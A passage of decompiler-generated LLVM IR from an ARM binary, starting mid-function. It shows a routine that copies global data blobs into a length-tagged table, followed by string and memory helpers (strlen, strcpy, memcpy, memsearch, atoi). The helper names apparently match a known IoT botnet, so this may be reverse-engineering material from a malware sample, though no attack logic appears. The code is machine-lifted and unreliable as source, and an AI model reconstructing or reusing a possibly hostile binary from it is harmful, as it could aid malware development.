  %v0_11578 = load i32, i32* @fp, align 4
  store i32 %v0_11578, i32* @r0, align 4
  %v2_1157c = load i32, i32* @r4, align 4
  %v4_1157c = add i32 %v2_1157c, 380
  %v5_1157c = inttoptr i32 %v4_1157c to i16*
  store i16 16, i16* %v5_1157c, align 2
  %v0_11580 = load i32, i32* @r5, align 4
  store i32 %v0_11580, i32* @global_var_262ac.440, align 4
  %v0_11584 = call i32 @malloc()
  %v0_1158c = load i32, i32* @fp, align 4
  store i32 %v0_11584, i32* @r5, align 4
  %v3_11594 = call i32 @util_memcpy(i32 %v0_11584, i32 ptrtoint (i32* @global_var_1ab8c.442 to i32), i32 %v0_1158c)
  %v0_1159c = load i32, i32* @sl, align 4
  store i32 %v0_1159c, i32* @r0, align 4
  %v0_115a0 = load i32, i32* @fp, align 4
  %v1_115a0 = trunc i32 %v0_115a0 to i16
  %v2_115a0 = load i32, i32* @r4, align 4
  %v4_115a0 = add i32 %v2_115a0, 388
  %v5_115a0 = inttoptr i32 %v4_115a0 to i16*
  store i16 %v1_115a0, i16* %v5_115a0, align 2
  %v0_115a4 = load i32, i32* @r5, align 4
  store i32 %v0_115a4, i32* @global_var_262b4.443, align 4
  %v0_115a8 = call i32 @malloc()
  %v0_115b0 = load i32, i32* @sl, align 4
  store i32 %v0_115a8, i32* @r5, align 4
  %v4_115b8 = call i32 @util_memcpy(i32 %v0_115a8, i32 ptrtoint ([9 x i8]* @global_var_1aba0.445 to i32), i32 %v0_115b0)
  %v0_115c0 = load i32, i32* @r7, align 4
  store i32 %v0_115c0, i32* @r0, align 4
  %v0_115c4 = load i32, i32* @sl, align 4
  %v1_115c4 = trunc i32 %v0_115c4 to i16
  %v2_115c4 = load i32, i32* @r4, align 4
  %v4_115c4 = add i32 %v2_115c4, 396
  %v5_115c4 = inttoptr i32 %v4_115c4 to i16*
  store i16 %v1_115c4, i16* %v5_115c4, align 2
  %v0_115c8 = load i32, i32* @r5, align 4
  store i32 %v0_115c8, i32* @global_var_262bc.446, align 4
  %v0_115cc = call i32 @malloc()
  %v0_115d4 = load i32, i32* @r7, align 4
  store i32 %v0_115cc, i32* @r5, align 4
  %v3_115dc = call i32 @util_memcpy(i32 %v0_115cc, i32 ptrtoint (i32* @global_var_1ab00.448 to i32), i32 %v0_115d4)
  %v0_115e4 = load i32, i32* @r6, align 4
  store i32 %v0_115e4, i32* @r0, align 4
  %v0_115e8 = load i32, i32* @r7, align 4
  %v1_115e8 = trunc i32 %v0_115e8 to i16
  %v2_115e8 = load i32, i32* @r4, align 4
  %v4_115e8 = add i32 %v2_115e8, 404
  %v5_115e8 = inttoptr i32 %v4_115e8 to i16*
  store i16 %v1_115e8, i16* %v5_115e8, align 2
  %v0_115ec = load i32, i32* @r5, align 4
  store i32 %v0_115ec, i32* @global_var_262c4.449, align 4
  %v0_115f0 = call i32 @malloc()
  %v0_115f4 = load i32, i32* @r6, align 4
  store i32 %v0_115f0, i32* @r5, align 4
  %v3_11600 = call i32 @util_memcpy(i32 %v0_115f0, i32 ptrtoint (i32* @global_var_1abac.451 to i32), i32 %v0_115f4)
  store i32 18, i32* @r0, align 4
  %v0_1160c = load i32, i32* @r6, align 4
  %v1_1160c = trunc i32 %v0_1160c to i16
  %v2_1160c = load i32, i32* @r4, align 4
  %v4_1160c = add i32 %v2_1160c, 412
  %v5_1160c = inttoptr i32 %v4_1160c to i16*
  store i16 %v1_1160c, i16* %v5_1160c, align 2
  %v0_11610 = load i32, i32* @r5, align 4
  store i32 %v0_11610, i32* @global_var_262cc.452, align 4
  %v0_11614 = call i32 @malloc()
  store i32 %v0_11614, i32* @r5, align 4
  %v3_11624 = call i32 @util_memcpy(i32 %v0_11614, i32 ptrtoint (i32* @global_var_1abbc.454 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_11634 = load i32, i32* @r4, align 4
  %v4_11634 = add i32 %v2_11634, 420
  %v5_11634 = inttoptr i32 %v4_11634 to i16*
  store i16 18, i16* %v5_11634, align 2
  %v0_11638 = load i32, i32* @r5, align 4
  store i32 %v0_11638, i32* @global_var_262d4.455, align 4
  %v0_1163c = call i32 @malloc()
  store i32 %v0_1163c, i32* %r5.global-to-local, align 4
  %v3_1164c = call i32 @util_memcpy(i32 %v0_1163c, i32 ptrtoint (i32* @global_var_1abd0.457 to i32), i32 25)
  store i32 115, i32* @r0, align 4
  %v2_1165c = load i32, i32* @r4, align 4
  %v4_1165c = add i32 %v2_1165c, 428
  %v5_1165c = inttoptr i32 %v4_1165c to i16*
  store i16 25, i16* %v5_1165c, align 2
  %v0_11660 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11660, i32* @global_var_262dc.458, align 4
  %v0_11664 = load i32, i32* @r0, align 4
  store i32 %v0_11664, i32* @r5, align 4
  %v0_11668 = call i32 @malloc()
  %v0_1166c = load i32, i32* @r5, align 4
  store i32 %v0_11668, i32* @r6, align 4
  %v3_11678 = call i32 @util_memcpy(i32 %v0_11668, i32 ptrtoint (i32* @global_var_1abec.460 to i32), i32 %v0_1166c)
  %v0_11680 = load i32, i32* @r5, align 4
  store i32 %v0_11680, i32* @r0, align 4
  %v1_11684 = trunc i32 %v0_11680 to i16
  %v2_11684 = load i32, i32* @r4, align 4
  %v4_11684 = add i32 %v2_11684, 436
  %v5_11684 = inttoptr i32 %v4_11684 to i16*
  store i16 %v1_11684, i16* %v5_11684, align 2
  %v0_11688 = load i32, i32* @r6, align 4
  store i32 %v0_11688, i32* @global_var_262e4.461, align 4
  %v0_1168c = call i32 @malloc()
  %v0_11690 = load i32, i32* @r5, align 4
  store i32 %v0_1168c, i32* @r6, align 4
  %v3_1169c = call i32 @util_memcpy(i32 %v0_1168c, i32 ptrtoint (i32* @global_var_1ac60.463 to i32), i32 %v0_11690)
  store i32 79, i32* @r0, align 4
  %v0_116a8 = load i32, i32* @r5, align 4
  %v1_116a8 = trunc i32 %v0_116a8 to i16
  %v2_116a8 = load i32, i32* @r4, align 4
  %v4_116a8 = add i32 %v2_116a8, 444
  %v5_116a8 = inttoptr i32 %v4_116a8 to i16*
  store i16 %v1_116a8, i16* %v5_116a8, align 2
  %v0_116ac = load i32, i32* @r6, align 4
  store i32 %v0_116ac, i32* @global_var_262ec.464, align 4
  %v0_116b0 = call i32 @malloc()
  store i32 %v0_116b0, i32* %r5.global-to-local, align 4
  %v3_116c0 = call i32 @util_memcpy(i32 %v0_116b0, i32 ptrtoint (i32* @global_var_1acd4.466 to i32), i32 79)
  store i32 114, i32* @r0, align 4
  %v2_116d0 = load i32, i32* @r4, align 4
  %v4_116d0 = add i32 %v2_116d0, 452
  %v5_116d0 = inttoptr i32 %v4_116d0 to i16*
  store i16 79, i16* %v5_116d0, align 2
  %v0_116d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116d4, i32* @global_var_262f4.467, align 4
  %v0_116d8 = load i32, i32* @r0, align 4
  store i32 %v0_116d8, i32* @r5, align 4
  %v0_116dc = call i32 @malloc()
  %v0_116e0 = load i32, i32* @r5, align 4
  store i32 %v0_116dc, i32* @r6, align 4
  %v3_116ec = call i32 @util_memcpy(i32 %v0_116dc, i32 ptrtoint (i32* @global_var_1ad24.469 to i32), i32 %v0_116e0)
  %v0_116f4 = load i32, i32* @r5, align 4
  store i32 %v0_116f4, i32* @r0, align 4
  %v1_116f8 = trunc i32 %v0_116f4 to i16
  %v2_116f8 = load i32, i32* @r4, align 4
  %v4_116f8 = add i32 %v2_116f8, 460
  %v5_116f8 = inttoptr i32 %v4_116f8 to i16*
  store i16 %v1_116f8, i16* %v5_116f8, align 2
  %v0_116fc = load i32, i32* @r6, align 4
  store i32 %v0_116fc, i32* @global_var_262fc.470, align 4
  %v0_11700 = call i32 @malloc()
  %v0_11704 = load i32, i32* @r5, align 4
  store i32 %v0_11700, i32* @r6, align 4
  %v3_11710 = call i32 @util_memcpy(i32 %v0_11700, i32 ptrtoint (i32* @global_var_1ad98.472 to i32), i32 %v0_11704)
  %v0_11718 = load i32, i32* @r8, align 4
  store i32 %v0_11718, i32* @r0, align 4
  %v0_1171c = load i32, i32* @r5, align 4
  %v1_1171c = trunc i32 %v0_1171c to i16
  %v2_1171c = load i32, i32* @r4, align 4
  %v4_1171c = add i32 %v2_1171c, 468
  %v5_1171c = inttoptr i32 %v4_1171c to i16*
  store i16 %v1_1171c, i16* %v5_1171c, align 2
  %v0_11720 = load i32, i32* @r6, align 4
  store i32 %v0_11720, i32* @global_var_26304.473, align 4
  %v0_11724 = call i32 @malloc()
  %v0_1172c = load i32, i32* @r8, align 4
  store i32 %v0_11724, i32* @r5, align 4
  %v3_11734 = call i32 @util_memcpy(i32 %v0_11724, i32 ptrtoint (i32* @global_var_1ae0c.475 to i32), i32 %v0_1172c)
  store i32 26, i32* @r0, align 4
  %v0_11740 = load i32, i32* @r8, align 4
  %v1_11740 = trunc i32 %v0_11740 to i16
  %v2_11740 = load i32, i32* @r4, align 4
  %v4_11740 = add i32 %v2_11740, 476
  %v5_11740 = inttoptr i32 %v4_11740 to i16*
  store i16 %v1_11740, i16* %v5_11740, align 2
  %v0_11744 = load i32, i32* @r5, align 4
  store i32 %v0_11744, i32* @global_var_2630c.476, align 4
  %v0_11748 = call i32 @malloc()
  store i32 %v0_11748, i32* @r5, align 4
  %v3_11758 = call i32 @util_memcpy(i32 %v0_11748, i32 ptrtoint (i32* @global_var_1ae24.478 to i32), i32 26)
  store i32 23, i32* @r0, align 4
  %v2_11768 = load i32, i32* @r4, align 4
  %v4_11768 = add i32 %v2_11768, 484
  %v5_11768 = inttoptr i32 %v4_11768 to i16*
  store i16 26, i16* %v5_11768, align 2
  %v0_1176c = load i32, i32* @r5, align 4
  store i32 %v0_1176c, i32* @global_var_26314.479, align 4
  %v0_11770 = call i32 @malloc()
  store i32 %v0_11770, i32* @r5, align 4
  %v3_11780 = call i32 @util_memcpy(i32 %v0_11770, i32 ptrtoint (i32* @global_var_1ae40.481 to i32), i32 23)
  %v0_1178c = load i32, i32* @r7, align 4
  store i32 %v0_1178c, i32* @r0, align 4
  %v2_11790 = load i32, i32* @r4, align 4
  %v4_11790 = add i32 %v2_11790, 492
  %v5_11790 = inttoptr i32 %v4_11790 to i16*
  store i16 23, i16* %v5_11790, align 2
  %v0_11794 = load i32, i32* @r5, align 4
  store i32 %v0_11794, i32* @global_var_2631c.482, align 4
  %v0_11798 = call i32 @malloc()
  %v0_117a0 = load i32, i32* @r7, align 4
  store i32 %v0_11798, i32* %r5.global-to-local, align 4
  %v4_117a8 = call i32 @util_memcpy(i32 %v0_11798, i32 ptrtoint ([12 x i8]* @global_var_1ae58.484 to i32), i32 %v0_117a0)
  %v0_117b0 = load i32, i32* @r7, align 4
  %v1_117b0 = trunc i32 %v0_117b0 to i16
  %v2_117b0 = load i32, i32* @r4, align 4
  %v4_117b0 = add i32 %v2_117b0, 500
  %v5_117b0 = inttoptr i32 %v4_117b0 to i16*
  store i16 %v1_117b0, i16* %v5_117b0, align 2
  %v0_117b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_117b4, i32* @global_var_26324.485, align 4
  store i32 %v3_10f24, i32* @r4, align 4
  store i32 %v6_10f24, i32* @r5, align 4
  store i32 %v9_10f24, i32* @r6, align 4
  store i32 %v12_10f24, i32* @r7, align 4
  store i32 %v15_10f24, i32* @r8, align 4
  store i32 %v21_10f24, i32* @sl, align 4
  store i32 %v24_10f24, i32* @fp, align 4
  ret i32 %v4_117a8

; uselistorder directives
  uselistorder i32 %v0_11798, { 1, 0 }
  uselistorder i32 %v0_11724, { 1, 0 }
  uselistorder i32 %v0_11700, { 1, 0 }
  uselistorder i32 %v0_116dc, { 1, 0 }
  uselistorder i32 %v0_1168c, { 1, 0 }
  uselistorder i32 %v0_11668, { 1, 0 }
  uselistorder i32 %v0_115f0, { 1, 0 }
  uselistorder i32 %v0_115cc, { 1, 0 }
  uselistorder i32 %v0_115a8, { 1, 0 }
  uselistorder i32 %v0_11584, { 1, 0 }
  uselistorder i32 %v0_11538, { 1, 0 }
  uselistorder i32 %v0_114ec, { 1, 0 }
  uselistorder i32 %v0_114c4, { 1, 0 }
  uselistorder i32 %v0_113fc, { 1, 0 }
  uselistorder i32 %v0_113b0, { 1, 0 }
  uselistorder i32 %v0_1138c, { 1, 0 }
  uselistorder i32 %v0_1133c, { 1, 0 }
  uselistorder i32 %v0_112f4, { 1, 0 }
  uselistorder i32 %v0_112d4, { 1, 0 }
  uselistorder i32 %v0_11290, { 1, 0 }
  uselistorder i32 %v0_1124c, { 1, 0 }
  uselistorder i32 %v0_1122c, { 1, 0 }
  uselistorder i32 %v0_1120c, { 1, 0 }
  uselistorder i32 %v0_111c4, { 1, 0 }
  uselistorder i32 %v0_11180, { 1, 0 }
  uselistorder i32 %v0_11160, { 1, 0 }
  uselistorder i32 %v0_11140, { 1, 0 }
  uselistorder i32 %v0_110fc, { 1, 0 }
  uselistorder i32 %v0_110d8, { 1, 0 }
  uselistorder i32 %v0_110b8, { 1, 0 }
  uselistorder i32 %v0_11074, { 1, 0 }
  uselistorder i32 %v0_11050, { 1, 0 }
  uselistorder i32 %v0_1102c, { 1, 0 }
  uselistorder i32 %v0_11008, { 1, 0 }
  uselistorder i32 %v0_10f9c, { 1, 0 }
  uselistorder i32 %v0_10f78, { 1, 0 }
  uselistorder i32 %v0_10f58, { 1, 0 }
  uselistorder i32 %v0_10f30, { 1, 0 }
  uselistorder i16 10, { 1, 0 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 29, { 0, 9, 1, 6, 2, 7, 3, 8, 10, 4, 5 }
  uselistorder i32 23, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_26134.272 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_118b8 = load i8, i8* %arg1, align 1
  %v2_118bc = icmp eq i8 %v3_118b8, 0
  %v0_118c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_118bc, i32 %v0_118c0)
  br label %dec_label_pc_118c8

dec_label_pc_118c8:                               ; preds = %dec_label_pc_118c8, %entry
  %v0_118c8 = phi i32 [ %v1_118c8, %dec_label_pc_118c8 ], [ 0, %entry ]
  %v1_118c8 = add i32 %v0_118c8, 1
  %v2_118cc = add i32 %v1_118c8, %tmp
  %v3_118cc = inttoptr i32 %v2_118cc to i8*
  %v4_118cc = load i8, i8* %v3_118cc, align 1
  %v6_118cc = zext i8 %v4_118cc to i32
  store i32 %v6_118cc, i32* @r3, align 4
  %v2_118d0 = icmp eq i8 %v4_118cc, 0
  br i1 %v2_118d0, label %dec_label_pc_118d8, label %dec_label_pc_118c8

dec_label_pc_118d8:                               ; preds = %dec_label_pc_118c8
  ret i32 %v1_118c8
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_118dc = load i8, i8* %arg1, align 1
  %v3_118dc = zext i8 %v2_118dc to i32
  %v2_118e0 = icmp eq i8 %v2_118dc, 0
  br i1 %v2_118e0, label %bb, label %dec_label_pc_118ec

bb:                                               ; preds = %entry
  store i32 %v3_118dc, i32* @ip, align 4
  br label %dec_label_pc_11900

dec_label_pc_118ec:                               ; preds = %entry
  br label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118f0, %dec_label_pc_118ec
  %v0_118f0 = phi i32 [ %v1_118f0, %dec_label_pc_118f0 ], [ 0, %dec_label_pc_118ec ]
  %v1_118f0 = add i32 %v0_118f0, 1
  store i32 %v1_118f0, i32* @ip, align 4
  %v2_118f4 = add i32 %v1_118f0, %tmp
  %v3_118f4 = inttoptr i32 %v2_118f4 to i8*
  %v4_118f4 = load i8, i8* %v3_118f4, align 1
  %v2_118f8 = icmp eq i8 %v4_118f4, 0
  br i1 %v2_118f8, label %dec_label_pc_11900, label %dec_label_pc_118f0

dec_label_pc_11900:                               ; preds = %dec_label_pc_118f0, %bb
  %v0_11900 = phi i32 [ %v3_118dc, %bb ], [ %v1_118f0, %dec_label_pc_118f0 ]
  br label %dec_label_pc_1190c

dec_label_pc_11908:                               ; preds = %dec_label_pc_1190c
  %v0_11908 = load i32, i32* @r1, align 4
  %v1_11908 = add i32 %v0_11908, 1
  %v2_11908 = inttoptr i32 %v1_11908 to i8*
  %v3_11908 = load i8, i8* %v2_11908, align 1
  store i32 %v1_11908, i32* @r1, align 4
  %v0_1190c.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %dec_label_pc_11900, %dec_label_pc_11908
  %v0_11914.off0 = phi i8 [ %v2_118dc, %dec_label_pc_11900 ], [ %v3_11908, %dec_label_pc_11908 ]
  %v0_1190c = phi i32 [ %v0_11900, %dec_label_pc_11900 ], [ %v0_1190c.pr, %dec_label_pc_11908 ]
  %v1_1190c = add i32 %v0_1190c, -1
  store i32 %v1_1190c, i32* @r3, align 4
  %v3_11910 = icmp eq i32 %v0_1190c, 0
  %v2_11914 = load i32, i32* @r0, align 4
  %v3_11914 = inttoptr i32 %v2_11914 to i8*
  store i8 %v0_11914.off0, i8* %v3_11914, align 1
  %v4_11914 = load i32, i32* @r0, align 4
  %v5_11914 = add i32 %v4_11914, 1
  store i32 %v5_11914, i32* @r0, align 4
  br i1 %v3_11910, label %dec_label_pc_1191c, label %dec_label_pc_11908

dec_label_pc_1191c:                               ; preds = %dec_label_pc_1190c
  %v0_1191c = load i32, i32* @ip, align 4
  ret i32 %v0_1191c

; uselistorder directives
  uselistorder i32 %v0_1190c, { 1, 0 }
  uselistorder i32 %v1_118f0, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1190c, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_11924 = icmp eq i32 %arg3, 0
  %v0_11928 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11924, i32 %v0_11928)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11930

dec_label_pc_11930:                               ; preds = %dec_label_pc_11930, %entry
  %v0_11930 = phi i32 [ %v1_11938, %dec_label_pc_11930 ], [ 0, %entry ]
  %v2_11930 = add i32 %v0_11930, %arg2
  %v3_11930 = inttoptr i32 %v2_11930 to i8*
  %v4_11930 = load i8, i8* %v3_11930, align 1
  %v4_11934 = add i32 %v0_11930, %arg1
  %v5_11934 = inttoptr i32 %v4_11934 to i8*
  store i8 %v4_11930, i8* %v5_11934, align 1
  %v0_11938 = load i32, i32* %ip.global-to-local, align 4
  %v1_11938 = add i32 %v0_11938, 1
  store i32 %v1_11938, i32* %ip.global-to-local, align 4
  %v9_1193c = icmp eq i32 %v1_11938, %arg3
  br i1 %v9_1193c, label %dec_label_pc_11944, label %dec_label_pc_11930

dec_label_pc_11944:                               ; preds = %dec_label_pc_11930
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_11938, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v2_11948 = icmp eq i32 %arg2, 0
  %v0_1194c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11948, i32 %v0_1194c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11954

dec_label_pc_11954:                               ; preds = %dec_label_pc_11954, %entry
  %v2_11958 = phi i32 [ %v1_1195c, %dec_label_pc_11954 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v4_11958 = add i32 %v2_11958, %arg1
  %v5_11958 = inttoptr i32 %v4_11958 to i8*
  store i8 0, i8* %v5_11958, align 1
  %v0_1195c = load i32, i32* %r2.global-to-local, align 4
  %v1_1195c = add i32 %v0_1195c, 1
  store i32 %v1_1195c, i32* %r2.global-to-local, align 4
  %v9_11960 = icmp eq i32 %v1_1195c, %arg2
  br i1 %v9_11960, label %dec_label_pc_11968, label %dec_label_pc_11954

dec_label_pc_11968:                               ; preds = %dec_label_pc_11954
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1195c, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_11980 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_11980, label %dec_label_pc_11988, label %dec_label_pc_11990

dec_label_pc_11988:                               ; preds = %dec_label_pc_119a4, %dec_label_pc_11990, %entry, %dec_label_pc_119d0
  %storemerge = phi i32 [ %v1_119d0, %dec_label_pc_119d0 ], [ -1, %entry ], [ -1, %dec_label_pc_11990 ], [ -1, %dec_label_pc_119a4 ]
  ret i32 %storemerge

dec_label_pc_11990:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_11988, label %dec_label_pc_11998

dec_label_pc_11998:                               ; preds = %dec_label_pc_11990
  br label %dec_label_pc_119b0

dec_label_pc_119a4:                               ; preds = %bb, %dec_label_pc_119c4
  %v1_119b03 = phi i32 [ %v1_119c4, %dec_label_pc_119c4 ], [ 0, %bb ]
  %v1_119a4 = add i32 %v0_119d0, 1
  %v9_119a8 = icmp eq i32 %v1_119a4, %arg2
  br i1 %v9_119a8, label %dec_label_pc_11988, label %dec_label_pc_119b0

dec_label_pc_119b0:                               ; preds = %dec_label_pc_119a4, %dec_label_pc_11998
  %v0_119d0 = phi i32 [ %v1_119a4, %dec_label_pc_119a4 ], [ 0, %dec_label_pc_11998 ]
  %v1_119b0 = phi i32 [ %v1_119b03, %dec_label_pc_119a4 ], [ 0, %dec_label_pc_11998 ]
  %v2_119b0 = add i32 %v1_119b0, %arg3
  %v3_119b0 = inttoptr i32 %v2_119b0 to i8*
  %v4_119b0 = load i8, i8* %v3_119b0, align 1
  %v2_119b4 = add i32 %v0_119d0, %arg1
  %v3_119b4 = inttoptr i32 %v2_119b4 to i8*
  %v4_119b4 = load i8, i8* %v3_119b4, align 1
  %v9_119b8 = icmp eq i8 %v4_119b4, %v4_119b0
  br i1 %v9_119b8, label %dec_label_pc_119c4, label %bb

bb:                                               ; preds = %dec_label_pc_119b0
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_119a4

dec_label_pc_119c4:                               ; preds = %dec_label_pc_119b0
  %v1_119c4 = add i32 %v1_119b0, 1
  store i32 %v1_119c4, i32* @ip, align 4
  %v9_119c8 = icmp eq i32 %v1_119c4, %arg4
  br i1 %v9_119c8, label %dec_label_pc_119d0, label %dec_label_pc_119a4

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119c4
  %v1_119d0 = add i32 %v0_119d0, 1
  br label %dec_label_pc_11988

; uselistorder directives
  uselistorder i32 %v1_119c4, { 1, 2, 0 }
  uselistorder i32 %v1_119b0, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_119a4, { 1, 0 }
  uselistorder label %dec_label_pc_11988, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_119e8

dec_label_pc_119e8:                               ; preds = %.thread, %dec_label_pc_119fc, %bb, %entry
  %v0_119e8 = phi i32 [ %tmp, %entry ], [ %v5_119e8, %bb ], [ %v5_119e8, %dec_label_pc_119fc ], [ %v5_119e8, %.thread ]
  %v1_119e8 = inttoptr i32 %v0_119e8 to i8*
  %v2_119e8 = load i8, i8* %v1_119e8, align 1
  %v5_119e8 = add i32 %v0_119e8, 1
  %v7_119ec = icmp eq i8 %v2_119e8, 9
  br i1 %v7_119ec, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_119e8
  br label %dec_label_pc_119e8

bb:                                               ; preds = %dec_label_pc_119e8
  %v8_119f0 = icmp eq i8 %v2_119e8, 32
  br i1 %v8_119f0, label %dec_label_pc_119e8, label %dec_label_pc_119fc

dec_label_pc_119fc:                               ; preds = %bb
  %v7_119fc = icmp eq i8 %v2_119e8, 10
  br i1 %v7_119fc, label %dec_label_pc_119e8, label %dec_label_pc_11a04

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119fc
  %v7_11a04 = icmp eq i8 %v2_119e8, 45
  br i1 %v7_11a04, label %dec_label_pc_11af4, label %dec_label_pc_11a0c

dec_label_pc_11a0c:                               ; preds = %dec_label_pc_11a04
  %v7_11a0c = icmp eq i8 %v2_119e8, 43
  br i1 %v7_11a0c, label %bb54, label %dec_label_pc_11a1c

bb54:                                             ; preds = %dec_label_pc_11a0c
  %v2_11a10 = inttoptr i32 %v5_119e8 to i8*
  %v3_11a10 = load i8, i8* %v2_11a10, align 1
  %v6_11a10 = add i32 %v0_119e8, 2
  br label %dec_label_pc_11a1c

dec_label_pc_11a1c:                               ; preds = %bb54, %dec_label_pc_11a0c, %dec_label_pc_11af4
  %v1_11ac439 = phi i32 [ %v5_11af4, %dec_label_pc_11af4 ], [ %v5_119e8, %dec_label_pc_11a0c ], [ %v6_11a10, %bb54 ]
  %v0_11a4410.in = phi i8 [ %v2_11af4, %dec_label_pc_11af4 ], [ %v2_119e8, %dec_label_pc_11a0c ], [ %v3_11a10, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_11af4 ], [ 2147483647, %dec_label_pc_11a0c ], [ 2147483647, %bb54 ]
  %v0_11b04 = phi i32 [ 1, %dec_label_pc_11af4 ], [ 0, %dec_label_pc_11a0c ], [ 0, %bb54 ]
  %v2_11a24 = udiv i32 %storemerge1, %arg2
  %v3_11a24 = urem i32 %storemerge1, %arg2
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_11a44.outer

dec_label_pc_11a44.outer:                         ; preds = %.thread5, %dec_label_pc_11a1c
  %v1_11ac4.ph = phi i32 [ %v6_11ac4, %.thread5 ], [ %v1_11ac439, %dec_label_pc_11a1c ]
  %v2_11ac0.ph = phi i32 [ %v5_11ac0, %.thread5 ], [ 0, %dec_label_pc_11a1c ]
  %v1_11a84.ph.in = phi i8 [ %v3_11ac4, %.thread5 ], [ %v0_11a4410.in, %dec_label_pc_11a1c ]
  %v1_11a9c.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_11a1c ]
  %v3_11a90 = icmp uge i32 %v2_11ac0.ph, %v2_11a24
  %v9_11a90 = icmp eq i32 %v2_11ac0.ph, %v2_11a24
  %v2_11a94 = xor i1 %v3_11a90, true
  %v3_11a94 = or i1 %v9_11a90, %v2_11a94
  %v2_11a98 = xor i1 %v9_11a90, true
  %v3_11a98 = and i1 %v3_11a90, %v2_11a98
  %v2_11ab8 = icmp eq i1 %v9_11a90, false
  br label %dec_label_pc_11a44

dec_label_pc_11a44:                               ; preds = %dec_label_pc_11a44.outer, %dec_label_pc_11acc
  %v1_11ac4 = phi i32 [ %v5_11acc, %dec_label_pc_11acc ], [ %v1_11ac4.ph, %dec_label_pc_11a44.outer ]
  %v1_11a9c = phi i32 [ -1, %dec_label_pc_11acc ], [ %v1_11a9c.ph, %dec_label_pc_11a44.outer ]
  %v1_11a84.in = phi i8 [ %v2_11acc, %dec_label_pc_11acc ], [ %v1_11a84.ph.in, %dec_label_pc_11a44.outer ]
  %v1_11a84 = zext i8 %v1_11a84.in to i32
  %v1_11a44 = urem i32 %v1_11a84, 256
  %v1_11a48 = add nsw i32 %v1_11a44, -48
  %v1_11a50 = add nsw i32 %v1_11a44, -97
  %v1_11a54 = add nsw i32 %v1_11a84, -48
  %v1_11a58 = add nsw i32 %v1_11a44, -65
  %tmp87 = icmp ult i32 %v1_11a48, 10
  br i1 %tmp87, label %dec_label_pc_11a88, label %dec_label_pc_11a60

dec_label_pc_11a60:                               ; preds = %dec_label_pc_11a44
  %v2_11a60 = icmp ugt i32 %v1_11a58, 24
  %v7_11a60 = icmp eq i32 %v1_11a58, 25
  %v2_11a64 = xor i1 %v7_11a60, true
  %v3_11a64 = and i1 %v2_11a60, %v2_11a64
  br i1 %v3_11a64, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_11a60
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_11a60, %bb55
  %v0_11a7815 = phi i32 [ %v1_11a54, %dec_label_pc_11a60 ], [ 0, %bb55 ]
  %v2_11a68 = xor i1 %v2_11a60, true
  %v3_11a68 = or i1 %v7_11a60, %v2_11a68
  br i1 %v3_11a68, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_11a78 = phi i32 [ %v0_11a7815, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_11a64, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_11a70 = icmp ugt i32 %v1_11a50, 24
  %v11_11a70 = icmp eq i32 %v1_11a50, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
